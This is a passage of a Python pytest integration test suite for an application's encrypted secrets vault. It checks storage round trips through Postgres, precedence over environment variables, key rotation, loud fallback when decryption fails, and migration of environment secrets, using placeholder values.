    try:
        monkeypatch.setattr(db, "load_registry", unreadable)
        db.reset_registry_disk_cache()      # the loader was swapped, not the file
        status = db.cim_status()
        assert status["restart_required"] is None, (
            "an unreadable file was reported as a definite yes/no; it is neither")
        assert "permission denied" in status["registry_disk_error"]
    finally:
        monkeypatch.undo()
        db.reset_registry_disk_cache()

    assert db.registry_drift()["disk_error"] is None, (
        "the unreadable-file simulation outlived this test: registry_drift still reports "
        "an error with the real loader restored")
    assert "current_tags" in status, "the rest of the stamp was lost with the file"


# ── secrets vault (Phase 2) ───────────────────────────────────────────────────
def _vault_key(monkeypatch):
    """Point the running process at a fresh vault key and clear the resolve cache."""
    from app.config import settings
    from app.vault import crypto, resolve
    raw = crypto.generate_key()
    object.__setattr__(settings, "vault_enabled", True)
    object.__setattr__(settings, "vault_key", raw)
    resolve.invalidate()
    return crypto.load_key(raw)


@pytest.mark.integration
def test_vault_secret_round_trips_through_postgres(clean_db, monkeypatch):
    """Seal -> store as bytea -> read back -> open. The bytea round trip is the part a
    DB-free test cannot cover: psycopg returns `memoryview`, not `bytes`."""
    from app import vault
    from app.vault import crypto
    db = clean_db
    key = _vault_key(monkeypatch)

    vault.set_secret("okta", "token", "s3cr3t-okta", updated_by="tester")
    row = db.get_secret_row("okta", "token")
    assert row is not None and row["key_id"] == crypto.key_id(key)
    # stored ciphertext must not contain the plaintext
    assert b"s3cr3t-okta" not in bytes(row["ciphertext"])
    assert crypto.open_(key, "okta", "token",
                        row["ciphertext"], row["nonce"]) == "s3cr3t-okta"


@pytest.mark.integration
def test_vault_resolution_prefers_the_vault_over_the_environment(clean_db, monkeypatch):
    """The migration contract: vault wins where present, env var still serves elsewhere."""
    from app import vault
    _vault_key(monkeypatch)

    vault.set_secret("okta", "token", "from-vault")
    assert vault.get("okta", "token", "from-env") == "from-vault"
    # a slot with nothing stored keeps working exactly as it did before Phase 2
    assert vault.get("github", "token", "from-env") == "from-env"
    assert vault.get("nothing", "here", "") == ""


@pytest.mark.integration
def test_vault_delete_falls_back_to_the_environment_again(clean_db, monkeypatch):
    from app import vault
    _vault_key(monkeypatch)
    vault.set_secret("okta", "token", "from-vault")
    assert vault.get("okta", "token", "from-env") == "from-vault"

    assert vault.delete_secret("okta", "token") is True
    assert vault.get("okta", "token", "from-env") == "from-env"   # cache was invalidated
    assert vault.delete_secret("okta", "token") is False          # idempotent


@pytest.mark.integration
def test_vault_set_overwrites_in_place_rather_than_duplicating(clean_db, monkeypatch):
    from app import vault
    db = clean_db
    _vault_key(monkeypatch)
    vault.set_secret("okta", "token", "first")
    vault.set_secret("okta", "token", "second")
    assert len([r for r in db.list_secrets() if r["integration"] == "okta"]) == 1
    assert vault.get("okta", "token", "") == "second"


@pytest.mark.integration
def test_list_secrets_never_exposes_ciphertext_or_plaintext(clean_db, monkeypatch):
    """What the admin page renders. It must be structurally incapable of leaking."""
    from app import vault
    db = clean_db
    _vault_key(monkeypatch)
    vault.set_secret("aws", "secret_access_key", "wJalrXUtnFEMI-plaintext")

    rows = db.list_secrets()
    assert rows and "ciphertext" not in rows[0] and "nonce" not in rows[0]
    assert "wJalrXUtnFEMI-plaintext" not in repr(rows)


@pytest.mark.integration
def test_vault_rotation_reseals_every_secret_under_the_new_key(clean_db, monkeypatch):
    from app import vault
    from app.config import settings
    from app.vault import crypto, resolve
    db = clean_db
    old = _vault_key(monkeypatch)

    vault.set_secret("okta", "token", "okta-value")
    vault.set_secret("aws", "secret_access_key", "aws-value")
    new_raw = crypto.generate_key()

    result = vault.rotate_key(new_raw)
    assert result.rotated == 2
    assert result.to_key_id == crypto.key_id(crypto.load_key(new_raw))
    assert result.from_key_ids == [crypto.key_id(old)]

    # every row now carries the new key_id, and opens under the NEW key only
    new = crypto.load_key(new_raw)
    for r in db.all_secret_rows():
        assert r["key_id"] == result.to_key_id
        crypto.open_(new, r["integration"], r["name"], r["ciphertext"], r["nonce"])
        with pytest.raises(crypto.VaultError):
            crypto.open_(old, r["integration"], r["name"], r["ciphertext"], r["nonce"])

    # and the values survived the round trip
    object.__setattr__(settings, "vault_key", new_raw)
    resolve.invalidate()
    assert vault.get("okta", "token", "") == "okta-value"
    assert vault.get("aws", "secret_access_key", "") == "aws-value"


@pytest.mark.integration
def test_vault_rotation_refuses_the_same_key(clean_db, monkeypatch):
    from app import vault
    from app.config import settings
    _vault_key(monkeypatch)
    vault.set_secret("okta", "token", "v")
    with pytest.raises(vault.VaultError):
        vault.rotate_key(settings.vault_key)


@pytest.mark.integration
def test_a_secret_that_cannot_be_opened_falls_back_loudly(clean_db, monkeypatch, caplog):
    """A sealed row under a retired key must NOT silently become the env-var value with
    no signal — the operator has to learn their vault is unreadable."""
    from app import vault
    from app.config import settings
    from app.vault import crypto, resolve
    _vault_key(monkeypatch)
    vault.set_secret("okta", "token", "sealed-under-old-key")

    object.__setattr__(settings, "vault_key", crypto.generate_key())   # retire the key
    resolve.invalidate()
    with caplog.at_level("ERROR"):
        assert vault.get("okta", "token", "from-env") == "from-env"
    assert any("could not decrypt" in r.message or "could not decrypt" in r.getMessage()
               for r in caplog.records)


@pytest.mark.integration
def test_migrate_env_secrets_is_idempotent_and_non_destructive(clean_db, monkeypatch):
    from app import vault
    from app.collectors import runner
    from app.config import settings
    db = clean_db
    _vault_key(monkeypatch)
    object.__setattr__(settings, "okta_token", "env-okta-token")
    object.__setattr__(settings, "github_token", "")        # unset stays unset

    moved = runner.migrate_env_secrets("tester")
    assert "okta/token" in moved and not any(m.startswith("github/") for m in moved)
    assert vault.get("okta", "token", "") == "env-okta-token"
    # the env var is deliberately NOT cleared - the operator removes it after verifying
    assert settings.okta_token == "env-okta-token"

    again = runner.migrate_env_secrets("tester")
    assert again == []                                       # already present, left alone
    assert len(db.list_secrets()) == 1
